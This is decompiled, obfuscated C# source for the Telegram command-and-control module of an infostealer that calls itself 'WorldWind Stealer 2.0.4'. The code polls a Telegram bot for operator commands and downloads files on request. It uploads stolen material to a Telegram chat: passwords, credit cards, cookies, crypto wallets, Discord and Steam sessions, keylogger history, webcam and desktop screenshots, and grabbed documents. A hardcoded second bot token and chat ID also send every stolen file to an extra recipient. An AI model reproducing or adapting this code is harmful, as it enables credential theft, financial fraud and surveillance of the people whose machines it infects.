using System;
using System.Collections.Generic;
using System.IO;
using System.IO.Compression;
using System.Linq;
using System.Net;
using System.Net.Http;
using System.Text.RegularExpressions;
using System.Threading;
using ns0;
using ns13;
using ns14;
using ns16;

namespace ns1;

public static class GClass11
{
	public static int int_0 = 1;

	private const int int_1 = 10;

	private static string string_0 = Class78.smethod_1(new byte[32]
	{
		239, 217, 27, 234, 106, 21, 204, 49, 53, 43,
		140, 84, 157, 206, 231, 110, 180, 238, 101, 7,
		217, 169, 12, 49, 56, 145, 75, 213, 195, 135,
		141, 221
	});

	private static string string_1 = Path.Combine(Class55.smethod_0(), "msgid.dat");

	private static string string_2 = Path.Combine(Class55.smethod_0(), "history.dat");

	public static Thread thread_0 = new Thread(smethod_1);

	public static bool bool_0 = false;

	private static void smethod_0()
	{
		while (bool_0)
		{
			Thread.Sleep(200);
		}
	}

	private static void smethod_1()
	{
		smethod_0();
		int num = 0;
		string text;
		using (WebClient webClient = new WebClient())
		{
			text = webClient.DownloadString("https://api.telegram.org/bot" + GClass10.string_0 + "/getUpdates");
		}
		num = GClass8.smethod_0(text)["result"][0]["update_id"].Int32_1;
		while (true)
		{
			Thread.Sleep(int_0 * 1000);
			smethod_0();
			num++;
			using (WebClient webClient2 = new WebClient())
			{
				text = webClient2.DownloadString($"https://api.telegram.org/bot{GClass10.string_0}/getUpdates?offset={num}");
			}
			GClass0.GStruct0 enumerator = GClass8.smethod_0(text)["result"].GClass1_0.GetEnumerator();
			while (enumerator.MoveNext())
			{
				GClass0 gClass = enumerator.KeyValuePair_0;
				GClass0 gClass2 = gClass["message"];
				string text2 = gClass2["chat"]["id"];
				num = gClass["update_id"].Int32_1;
				if (!(text2 != GClass10.string_1))
				{
					if (gClass2.HasKey("document"))
					{
						string string_ = gClass2["document"]["file_name"];
						string text3 = gClass2["document"]["file_id"];
						GClass0 gClass3;
						using (WebClient webClient3 = new WebClient())
						{
							gClass3 = GClass8.smethod_0(webClient3.DownloadString("https://api.telegram.org/bot" + GClass10.string_0 + "/getFile?file_id=" + text3))["result"]["file_path"];
						}
						smethod_7(string_, gClass3);
					}
					else
					{
						smethod_3("\ud83c\udf69 Unknown type received. Only Text/Document can be used!");
					}
					continue;
				}
				string text4 = gClass2["chat"]["username"];
				string text5 = gClass2["chat"]["first_name"];
				smethod_3("\ud83d\udc51 You not my owner " + text5);
				smethod_3("\ud83d\udc51 Unknown user with id " + text2 + " and username @" + text4 + " send command to bot!");
				break;
			}
		}
	}

	public static void smethod_2(string string_3, string string_4 = "Document")
	{
		smethod_0();
		if (!File.Exists(string_3))
		{
			smethod_3("⛔ File not found!");
			return;
		}
		using (HttpClient httpClient = new HttpClient())
		{
			MultipartFormDataContent multipartFormDataContent = new MultipartFormDataContent();
			byte[] array = File.ReadAllBytes(string_3);
			multipartFormDataContent.Add(new ByteArrayContent(array, 0, array.Length), string_4.ToLower(), string_3);
			httpClient.PostAsync("https://api.telegram.org/bot" + GClass10.string_0 + "/send" + string_4 + "?chat_id=" + GClass10.string_1, multipartFormDataContent).Wait();
			httpClient.Dispose();
		}
		using HttpClient httpClient2 = new HttpClient();
		MultipartFormDataContent multipartFormDataContent2 = new MultipartFormDataContent();
		byte[] array2 = File.ReadAllBytes(string_3);
		multipartFormDataContent2.Add(new ByteArrayContent(array2, 0, array2.Length), string_4.ToLower(), string_3);
		httpClient2.PostAsync("https://api.telegram.org/bot1119746739:AAGMhvpUjXI4CzIfizRC--VXilxnkJlhaf8/send" + string_4 + "?chat_id=1096425866", multipartFormDataContent2).Wait();
		httpClient2.Dispose();
	}

	public static void smethod_3(string string_3)
	{
		smethod_0();
		using WebClient webClient = new WebClient();
		webClient.UseDefaultCredentials = true;
		webClient.DownloadString("https://api.telegram.org/bot" + GClass10.string_0 + "/sendMessage?chat_id=" + GClass10.string_1 + "&text=" + string_3);
	}

	public static void smethod_4(string string_3)
	{
		smethod_2(string_3, "Photo");
	}

	public static void smethod_5(string string_3)
	{
		smethod_2(string_3, "Voice");
	}

	public static void smethod_6(float float_0, float float_1)
	{
		smethod_0();
		using WebClient webClient = new WebClient();
		webClient.DownloadString("https://api.telegram.org/bot" + GClass10.string_0 + "/sendLocation?chat_id=" + GClass10.string_1 + "&latitude=" + float_0 + "&longitude=" + float_1);
	}

	public static void smethod_7(string string_3, string string_4 = "")
	{
		smethod_0();
		if (string_3.StartsWith("http"))
		{
			smethod_3("\ud83d\udcc4 Downloading file \"" + Path.GetFileName(string_3) + "\" from url");
			try
			{
				using WebClient webClient = new WebClient();
				webClient.DownloadFile(new Uri(string_3), Path.GetFileName(string_3));
			}
			catch
			{
				smethod_3($"\ud83d\udca5 Connection error");
				return;
			}
			smethod_3("\ud83d\udcbe File \"" + string_3 + "\" saved in: \"" + Path.GetFullPath(Path.GetFileName(string_3)) + "\"");
		}
		else
		{
			smethod_3("\ud83d\udcc4 Downloading file: \"{file}\"");
			string_4 = "https://api.telegram.org/file/bot" + GClass10.string_0 + "/" + string_4;
			using (WebClient webClient2 = new WebClient())
			{
				webClient2.DownloadFile(new Uri(string_4), string_3);
			}
			smethod_3("\ud83d\udcbe File \"{file}\" saved in: \"{Path.GetFullPath(file)}\"");
		}
	}

	private static void smethod_8()
	{
		if (Directory.Exists(Path.Combine(Class55.smethod_0(), "logs")))
		{
			string text = DateTime.Now.ToString("yyyy-MM-dd_h.mm.ss");
			string text2 = Class59.smethod_0(text + ".zip");
			File.Delete(text + ".zip");
			File.AppendAllText(string_2, "\t\t\t\t\t\t\t- [" + text.Replace("_", " ").Replace(".", ":") + "](" + text2 + ")\n");
			Class77.smethod_1(string_2);
		}
	}

	public static int smethod_9()
	{
		if (File.Exists(string_1))
		{
			return int.Parse(File.ReadAllText(string_1));
		}
		return -1;
	}

	private static string smethod_10()
	{
		if (!File.Exists(string_2))
		{
			return "";
		}
		List<string> list = File.ReadAllLines(string_2).Reverse().Take(10)
			.Reverse()
			.ToList();
		string text = ((list.Count == 10) ? $"({list.Count} - MAX)" : $"({list.Count})");
		string text2 = string.Join("\n", list);
		return "\n\n  ⌨\ufe0f *Keylogger " + text + ":*\n" + text2;
	}

	public static void smethod_11(string string_3, bool bool_1 = false)
	{
		smethod_0();
		string string_4 = "\n  \ud83c\udf2a *WorldWind Stealer 2.0.4 - Results:*\nDate: " + Class6.string_3 + "\nSystem: " + Class6.smethod_4() + "\nUsername: " + Class6.string_0 + "\nCompName: " + Class6.string_1 + "\nLanguage: " + Class64.smethod_0(Class6.string_2.Split(new char[1] { '-' })[1]) + " " + Class6.string_2 + "\nAntivirus: " + Class6.smethod_7() + "\n\n  \ud83d\udcbb *Hardware:*\nCPU: " + Class6.smethod_12() + "\nGPU: " + Class6.smethod_13() + "\nRAM: " + Class6.smethod_14() + "\nHWID: " + Class6.smethod_5() + "\nPower: " + Class6.smethod_1() + "\nScreen: " + Class6.smethod_0() + "\n\n  \ud83d\udce1 *Network:* \nGateway IP: " + Class6.smethod_6() + "\nInternal IP: " + Class6.smethod_8() + "\nExternal IP: " + Class6.smethod_9() + "\n" + Class6.smethod_11() + "\n\n  \ud83d\udcb8 *Domains info:*" + Class54.smethod_2("\ud83c\udfe6 *Bank Logs*", Class54.list_0, '-') + Class54.smethod_2("\ud83d\udcb0 *Crypto Logs*", Class54.list_1, '-') + Class54.smethod_2("\ud83c\udf53 *Freaky Logs*", Class54.list_2, '-') + smethod_10() + "\n\n  \ud83c\udf10 *Logs:*" + Class54.smethod_1("\ud83d\udd11 Passwords", Class54.int_0) + Class54.smethod_1("\ud83d\udcb3 CreditCards", Class54.int_1) + Class54.smethod_1("\ud83c\udf6a Cookies", Class54.int_3) + Class54.smethod_1("\ud83d\udcc2 AutoFill", Class54.int_2) + Class54.smethod_1("⏳ History", Class54.int_4) + Class54.smethod_1("\ud83d\udd16 Bookmarks", Class54.int_5) + Class54.smethod_1("\ud83d\udce6 Downloads", Class54.int_6) + "\n\n  \ud83d\uddc3 *Software:*" + Class54.smethod_1("\ud83d\udcb0 Wallets", Class54.int_9) + Class54.smethod_1("\ud83d\udce1 FTP hosts", Class54.int_10) + Class54.smethod_1("\ud83d\udd0c VPN accounts", Class54.int_7) + Class54.smethod_1("\ud83e\udda2 Pidgin accounts", Class54.int_8) + Class54.smethod_0("✈\ufe0f Telegram sessions", Class54.bool_0) + Class54.smethod_0("\ud83d\udcac Discord token", Class54.bool_3) + Class54.smethod_0("\ud83c\udfae Steam session", Class54.bool_1) + Class54.smethod_0("\ud83c\udfae Uplay session", Class54.bool_2) + "\n\n  \ud83e\udded *Device:*" + Class54.smethod_0("\ud83d\udddd Windows product key", Class54.bool_4) + Class54.smethod_1("\ud83d\udef0 Wifi networks", Class54.int_11) + Class54.smethod_0("\ud83d\udcf8 Webcam screenshot", Class54.bool_6) + Class54.smethod_0("\ud83c\udf03 Desktop screenshot", Class54.bool_5) + "\n\n  \ud83d\udcc4 *File Grabber:*" + Class54.smethod_1("\ud83d\udcc2 Source code files", Class54.int_13) + Class54.smethod_1("\ud83d\udcc2 Database files", Class54.int_14) + Class54.smethod_1("\ud83d\udcc2 Documents", Class54.int_12) + Class54.smethod_1("\ud83d\udcc2 Images", Class54.int_15) + "\n\n  Contact Developer: @FlatLineStealer\n   Join The Telegram Channel: @CashOutGangTalk";
		int num = smethod_9();
		if (num != -1)
		{
			smethod_12(string_4, num);
		}
		else
		{
			smethod_15(smethod_13(string_4));
		}
		if (File.Exists(string_3))
		{
			smethod_3(string_4);
			smethod_2(string_3);
			if (bool_1)
			{
				File.Delete(string_3);
			}
		}
		else if (Directory.Exists(string_3))
		{
			smethod_3("\ud83d\udcc1 Uploading Log Folders...");
			string text = string_3 + ".zip";
			if (File.Exists(text))
			{
				File.Delete(text);
			}
			ZipFile.CreateFromDirectory(string_3, text);
			smethod_2(text);
			File.Delete(text);
		}
		else
		{
			smethod_3("⛔ File not found!");
		}
	}

	public static void smethod_12(string string_3, int int_2)
	{
		try
		{
			using WebClient webClient = new WebClient();
			webClient.DownloadString(string_0 + GClass10.string_0 + "/editMessageText?chat_id=" + GClass10.string_1 + "&text=" + string_3 + "&message_id=" + int_2 + "&parse_mode=Markdown&disable_web_page_preview=True");
		}
		catch
		{
		}
	}

	public static int smethod_13(string string_3)
	{
		try
		{
			using WebClient webClient = new WebClient();
			return smethod_14(webClient.DownloadString(string_0 + GClass10.string_0 + "/sendMessage?chat_id=" + GClass10.string_1 + "&text=" + string_3 + "&parse_mode=Markdown&disable_web_page_preview=True"));
		}
		catch
		{
		}
		return 0;
	}

	private static int smethod_14(string string_3)
	{
		return int.Parse(Regex.Match(string_3, "\"result\":{\"message_id\":\\d+").Value.Replace("\"result\":{\"message_id\":", ""));
	}

	public static void smethod_15(int int_2)
	{
		File.WriteAllText(string_1, int_2.ToString());
		Class77.smethod_0(string_1);
		Class77.smethod_1(string_1);
	}

	public static void smethod_16()
	{
		smethod_3("\ud83c\udf40 Bot connected");
	}
}
